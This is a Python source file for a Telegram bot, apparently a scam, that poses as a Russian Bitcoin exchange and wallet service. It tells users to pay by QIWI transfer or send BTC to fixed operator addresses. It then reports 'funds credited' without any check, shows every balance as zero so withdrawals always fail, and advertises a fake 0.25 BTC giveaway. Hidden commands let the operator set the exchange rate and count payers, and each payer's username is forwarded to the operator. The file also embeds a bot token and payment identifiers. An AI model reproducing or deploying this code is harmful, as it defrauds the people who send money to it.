import telebot
import cherrypy
import time
from telebot import types
from datetime import date, datetime
import random

#q1ncite
token = '1370200842:AAHj9GdZCdnE6mcgMLL5lmHj2J_qu5b6C0w'
bot = telebot.TeleBot(token)

WEBHOOK_HOST = '185.191.215.233'
WEBHOOK_PORT = 443
WEBHOOK_LISTEN = '0.0.0.0'
WEBHOOK_SSL_CERT = 'server.crt'     # Имя сертификата
WEBHOOK_SSL_PRIV = 'server.key'     # Имя ключа

WEBHOOK_URL_BASE = "https://%s:%s" % (WEBHOOK_HOST, WEBHOOK_PORT)
WEBHOOK_URL_PATH = "/%s/" % (token)


class WebhookServer(object):
    @cherrypy.expose
    def index(self):
        if 'content-length' in cherrypy.request.headers and \
           'content-type' in cherrypy.request.headers and \
            cherrypy.request.headers['content-type'] == 'application/json':
            length = int(cherrypy.request.headers['content-length'])
            json_string = cherrypy.request.body.read(length).decode("utf-8")
            update = telebot.types.Update.de_json(json_string)
            bot.process_new_updates([update])
            return ''
        else:
            raise cherrypy.HTTPError(403)


btc_address = '1FkXRm2mG3afa8pnW5mAKbsYZHXe5rMf6a'
qiwi_adress = '+79582517746'
btc = 647852
num_summa = 0
num_start = 0


def isfloat(value):
    try:
        float(value)
        return True
    except ValueError:
        return False


def kurs(message):
    global btc
    btc = int(message.text)


@bot.message_handler(commands=["start"])
def start(message):
    global num_start
    num_start += 1
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    keyboard.add(*[types.KeyboardButton(name) for name in ['💼 Кошелек', '📊 Обмен BTC', '🚀 О сервисе', '📌 Акция']])
    bot.send_message(message.chat.id, '✌️ Приветствуем Вас, ' + '<b>' + message.chat.first_name + '</b>' + '!\n\n'
                                      '🏧 <b>Bit+Coin</b> - это моментальный обмен <b>Bitcoin на Qiwi, Сбербанк,'
                                      ' Яндекс.Деньги и Webmoney</b>\n\n'
                                      '❕А так же бесплатное хранилище Ваших <b>BTC</b>\n\n', reply_markup=keyboard, parse_mode="Html")


def summa(message):
    if message.text.isdigit():
        if int(message.text) < 500:
            sent = bot.send_message(message.chat.id, '❌ Сумма в рублях <b>не должна быть меньше</b> 500 рублей', parse_mode="Html")
            bot.register_next_step_handler(sent, summa)
        elif int(message.text) > 20000:
            sent = bot.send_message(message.chat.id, '❌ Сумма в рублях <b>не должна быть больше</b> 20000 рублей', parse_mode="Html")
            bot.register_next_step_handler(sent, summa)
        else:
            money = float(message.text)/btc
            money = float("%.6f" % money)
            bot.send_message(message.chat.id, '✅ ' + str(message.text) + ' RUB' + ' = ' + str(money) + ' BTC\n\n'
                                              'Чтобы получить ' + '<b>' + str(money) + ' BTC</b>' + ' Вам необходимо совершить QIWI перевод на сумму ' + '<b>' + str(message.text) + ' rub</b> '
                                              'на счёт, который указан ниже\n\n'
                                              '<b>❗️ Комментарий обязательно</b>', parse_mode="Html")
            time.sleep(1)
            keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
            keyboard.add(*[types.KeyboardButton(name) for name in ['✅ Оплатил', '❌ Отказаться']])
            bot.send_message(message.chat.id, qiwi_adress + '\n'
                                              '<b>Комментарий:</b> ' + str(random.randrange(1, 99999)) + '\n\n', reply_markup=keyboard, parse_mode="Html")
        return
    if isfloat(message.text):
        if (float(message.text)*btc) < 500:
            money = 500/btc
            money = float("%.6f" % money)
            sent = bot.send_message(message.chat.id, '❌ Сумма в BTC <b>не должна быть меньше</b> ' + str(money) + ' BTC', parse_mode="Html")
            bot.register_next_step_handler(sent, summa)
        elif (float(message.text)*btc) > 20000:
            money = 20000/btc
            money = float("%.6f" % money)
            sent = bot.send_message(message.chat.id, '❌ Сумма в BTC <b>не должна быть больше</b> ' + str(money) + ' BTC', parse_mode="Html")
            bot.register_next_step_handler(sent, summa)
        else:
            money = float(message.text)*btc
            bot.send_message(message.chat.id, '✅ ' + str(message.text) + ' BTC' + ' = ' + str(round(money)) + ' RUB\n\n'
                                              'Чтобы получить ' + '<b>' + str(message.text) + ' BTC</b>' + ' Вам необходимо совершить QIWI перевод на сумму ' + '<b>' + str(round(money)) + ' rub</b> '
                                              'на счёт, который указан ниже\n\n'
                                              '<b>❗️ Комментарий обязательно</b>', parse_mode="Html")
            time.sleep(1)
            keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
            keyboard.add(*[types.KeyboardButton(name) for name in ['✅ Оплатил', '❌ Отказаться']])
            bot.send_message(message.chat.id, qiwi_adress + '\n'
                                              '<b>Комментарий:</b> ' + str(random.randrange(1, 99999)) + '\n\n', reply_markup=keyboard, parse_mode="Html")
        return
    elif message.text == '💼 Кошелек':
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(*[types.InlineKeyboardButton(text=name, callback_data=name) for name in ['📉 Вывести BTC', '📈 Внести BTC']])
        bot.send_message(message.chat.id, '<b>💼 Bitcoin-кошелек</b>\n\n'
                                          '<b>Баланс:</b> 0.00 BTC\n'
                                          '<b>Примерно:</b> 0 руб\n\n'
                                          '<b>Всего вывели:</b> 0.00 BTC (0 руб)\n'
                                          '<b>Всего пополнили:</b> 0.00 BTC (0 руб)\n', reply_markup=keyboard, parse_mode="Html")
        return
    elif message.text == '📊 Обмен BTC':
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(*[types.InlineKeyboardButton(text=name, callback_data=name) for name in ['📈 Купить', '📉 Продать']])
        bot.send_message(message.chat.id, '📊 <b>Купить/Продать Bitcoin</b>\n\n'
                                          'Бот работает полностью в <b>атоматическом режиме</b>. Средства поступают моментально\n', reply_markup=keyboard, parse_mode="Html")
        return
    elif message.text == '🚀 О сервисе':
        bot.send_message(message.chat.id, '🚀 <b>О сервисе</b>\n\n'
                                          'Сервис для обмена Bitcoin.\n'
                                          'Пополняй внутренний кошелек с помощью Qiwi или внешнего Bitcoin-кошелька\n\n'
                                          'Продавай эти BTC для вывода на Сбербанк, Яндекс.Деньги, Webmoney и Qiwi. Или выводи на свой внешний Bitcoin-адрес\n\n'
                                          'У нас установлено ограничение минимального <b>(500 рублей)</b> и максмального <b>(20000 рублей)</b> единовременного платежа\n\n', parse_mode="Html")
        return
    elif message.text == '📌 Акция':
        bot.send_message(message.chat.id, '📌 <b>Акция</b>\n\n'
                                          '<b>❗️Мы разыгрываем 0.25 BTC❗️</b>\n\n'
                                          'Для участия в конкурсе надо лишь воспользоваться нашим сервисом в период с <b>01.06.2020 по 01.07.2020</b> и иметь остаток на балансе не менее <b> 0.001 BTC</b>\n\n'
                                          'Этот остаток принадлежит Вам (не является платой за участие), после конкурса, даже в случае победы, никакая комиссия взиматься не будет\n\n'
                                          'Также <b>ОБЯЗАТЕЛЬНО укажите свой @username</b>, если он у Вас еще не указан\n\n'
                                          'Опредление победителя будет проходить в прямой трансляции на площадке <b>YouTube 1 июля 2020 года в 20:00 по Московскому времени</b>\n\n'
                                          '<b>Победитель получит 0.25 BTC на свой внутренний кошелек без каких либо коммиссий!</b>\n\n'
                                          'За 3 часа до начала Вам придет оповещение с ссылкой на трансляцию\n\n', parse_mode="Html")
        return
    elif message.text == '/start':
        return
    else: 
        sent = bot.send_message(message.chat.id, '❌ <b>Некорректный ввод</b>\nПопробуйте еще раз', parse_mode="Html")
        bot.register_next_step_handler(sent, summa)


def qiwi(chat_id):
    sent = bot.send_message(chat_id, '📥 <b>Qiwi</b>\n\nВведите сумму в <b>BTC</b> которую хотите получить или в <b>рублях</b> которые хотите перевести\n\nНапример: <b>0.002 или 500</b>\n\n'
                                     '<b>❗️ BTC вводить только через точку</b>\n\nКурс обмена:\n<code>1 BTC = ' + str(btc) + ' RUB</code>', parse_mode="Html")
    bot.register_next_step_handler(sent, summa)


@bot.message_handler(content_types=["text"])
def key(message):
    if message.text == '💼 Кошелек':
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(*[types.InlineKeyboardButton(text=name, callback_data=name) for name in ['📉 Вывести BTC', '📈 Внести BTC']])
        bot.send_message(message.chat.id, '<b>💼 Bitcoin-кошелек</b>\n\n'
                                          '<b>Баланс:</b> 0.00 BTC\n'
                                          '<b>Примерно:</b> 0 руб\n\n'
                                          '<b>Всего вывели:</b> 0.00 BTC (0 руб)\n'
                                          '<b>Всего пополнили:</b> 0.00 BTC (0 руб)\n', reply_markup=keyboard, parse_mode="Html")
    elif message.text == '📊 Обмен BTC':
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(*[types.InlineKeyboardButton(text=name, callback_data=name) for name in ['📈 Купить', '📉 Продать']])
        bot.send_message(message.chat.id, '📊 <b>Купить/Продать Bitcoin</b>\n\n'
                                          'Бот работает полностью в <b>атоматическом режиме</b>. Средства поступают моментально\n', reply_markup=keyboard, parse_mode="Html")
    elif message.text == '🚀 О сервисе':
        bot.send_message(message.chat.id, '🚀 <b>О сервисе</b>\n\n'
                                          'Сервис для обмена Bitcoin.\n'
                                          'Пополняй внутренний кошелек с помощью Qiwi или внешнего Bitcoin-кошелька\n\n'
                                          'Продавай эти BTC для вывода на Сбербанк, Яндекс.Деньги, Webmoney и Qiwi. Или выводи на свой внешний Bitcoin-адрес\n\n'
                                          'В боте установлено ограничение минимального <b>(500 рублей)</b> и максмального <b>(20000 рублей)</b> единовременного платежа\n\n', parse_mode="Html")
    elif message.text == '📌 Акция':
        bot.send_message(message.chat.id, '📌 <b>Акция</b>\n\n'
                                          '<b>❗️Мы разыгрываем 0.25 BTC❗️</b>\n\n'
                                          'Для участия в конкурсе необходимо лишь воспользоваться нашим сервисом в период с <b>01.07.2020 по 01.08.2020</b> и иметь остаток на балансе не менее <b>0.001 BTC</b>\n\n'    #q  1  n   c  i  t   e
                                          'Этот остаток принадлежит Вам (не является платой за участие). После конкурса, даже в случае победы, никакая комиссия взиматься не будет\n\n'
                                          'Так же <b>ОБЯЗАТЕЛЬНО укажите свой @username</b>, если он у Вас еще не указан\n\n'
                                          'Определение победителя будет проходить в прямой трансляции на площадке <b>YouTube 1 августа 2020 года в 20:00 по Московскому времени</b>\n\n'
                                          '<b>Победитель получит 0.25 BTC на свой внутренний кошелек без каких либо коммиссий!</b>\n\n'
                                          'За 3 часа до начала Вам придет оповещение с ссылкой на трансляцию\n\n', parse_mode="Html")
    elif message.text == '✅ Оплатил':
        global num_summa
        num_summa += 1
        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        keyboard.add(*[types.KeyboardButton(name) for name in ['💼 Кошелек', '📊 Обмен BTC', '🚀 О сервисе', '📌 Акция']])
        bot.send_message(message.chat.id, '✅ Успешно\n'
                                          'Денежные средства зачислены на кошелёк', reply_markup=keyboard, parse_mode="Html")
        print('Username - ', message.chat.username, ' ', datetime.now(), '\n', '[', message.chat.first_name, ' ', message.chat.last_name, ' ', message.chat.id, ']\n')
        bot.send_message(439066847, message.chat.username)
    elif message.text == '❌ Отказаться':
        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        keyboard.add(*[types.KeyboardButton(name) for name in ['💼 Кошелек', '📊 Обмен BTC', '🚀 О сервисе', '📌 Акция']])
        bot.send_message(message.chat.id, '⚠️ Вы можете приобрести BTC в любое другое время!\n', reply_markup=keyboard, parse_mode="Html")
    elif message.text == 'How many':
        bot.send_message(message.chat.id, 'Всего запустили бот: ' + str(num_start) + '\n'
                                          '✅ Оплатил: ' + str(num_summa))
    elif message.text == 'Курс111':
        sent = bot.send_message(message.chat.id, 'Введите курс btc')
        bot.register_next_step_handler(sent, kurs)


@bot.callback_query_handler(func=lambda c: True)
def inline(x):
    if x.data == '📈 Купить':
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(*[types.InlineKeyboardButton(text=name, callback_data=name) for name in ['📥 Qiwi', '📥 Bitcoin']])
        bot.send_message(x.message.chat.id, '📈 <b>Купить</b>\n\n'
                                            'Покупка BTC производится с помощью <b>Qiwi</b> или переводом на многоразовый <b>Bitcoin-адрес</b> с внешнего кошелька\n\n'
                                            'Выберите способ пополнения\n\n', reply_markup=keyboard, parse_mode="Html")
    elif x.data == '📉 Продать':
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(*[types.InlineKeyboardButton(text=name, callback_data=name) for name in ['Qiwi', 'Сбербанк', 'Webmoney', 'Яндекс.Деньги']])
        bot.send_message(x.message.chat.id, '📉 <b>Продать</b>\n\n'
                                            'Продажа BTC осуществляется путём списания с Вашего <b>внутреннего Bitcoin-кошелька</b> и последующей отправкой денежных средств на выбранную Вами площадку\n'
                                            'Куда Вы хотите вывести <b>BTC</b>?', reply_markup=keyboard, parse_mode="Html")
    elif x.data == '📉 Вывести BTC':
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(*[types.InlineKeyboardButton(text=name, callback_data=name) for name in ['📈 Купить']])
        bot.send_message(x.message.chat.id, '📉 <b>Вывести BTC</b>\n\n⚠️<b>У вас недостаточно BTC</b>\n'
                                            'Мин. сумма вывода: 0.0008 BTC', reply_markup=keyboard, parse_mode="Html")
    elif x.data == '📈 Внести BTC':
        bot.send_message(x.message.chat.id, '📈 <b>Внести BTC</b>\n\nЧтобы пополнить <b>Bitcoin-кошелек</b>, Вам надо перевести Ваши BTC на многоразовый адрес который будет указан ниже\n\n'
                                            'После перевода и подтверждения 1 транзакции, Ваши BTC будут отображаться у Вас в кошельке\n'
                                            'И вы их сможете вывести на любую другую платформу, или перевести на внешний Bitcoin-адрес', parse_mode="Html")
        time.sleep(1)
        bot.send_message(x.message.chat.id, '<b>' + str(btc_address) + '</b>', parse_mode="Html")
    elif x.data == 'Qiwi' or x.data == 'Сбербанк' or x.data == 'Яндекс.Деньги' or x.data == 'Webmoney':
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(*[types.InlineKeyboardButton(text=name, callback_data=name) for name in ['📈 Купить']])
        bot.send_message(x.message.chat.id, '⚠️ <b>У вас недостаточно BTC</b>\n'
                                            'Мин. сумма вывода: 0.0008 BTC', reply_markup=keyboard, parse_mode="Html")
    elif x.data == '📥 Qiwi':
        qiwi(x.message.chat.id)
    elif x.data == '📥 Bitcoin':
        bot.send_message(x.message.chat.id, '📥 <b>Bitcoin</b>\n\nЧтобы пополнить <b>Bitcoin-кошелек</b>, Вам надо перевести Ваши BTC на многоразовый адрес который будет указан ниже\n\n'
                                            'После перевода и подтверждения 1 транзакции, Ваши BTC будут отображаться у Вас в кошельке\n'
                                            'И вы их сможете вывести на любую другую платформу, или перевести на внешний Bitcoin-адрес', parse_mode="Html")
        time.sleep(0.3)
        bot.send_message(x.message.chat.id, '<b>' + str(btc_address) + '</b>', parse_mode="Html")


bot.remove_webhook()
bot.set_webhook(url=WEBHOOK_URL_BASE + WEBHOOK_URL_PATH, certificate=open(WEBHOOK_SSL_CERT, 'r'))

cherrypy.config.update({
    'server.socket_host': WEBHOOK_LISTEN,
    'server.socket_port': WEBHOOK_PORT,
    'server.ssl_module': 'builtin',
    'server.ssl_certificate': WEBHOOK_SSL_CERT,
    'server.ssl_private_key': WEBHOOK_SSL_PRIV     #q 1 n c i t e
})

cherrypy.quickstart(WebhookServer(), WEBHOOK_URL_PATH, {'/': {}})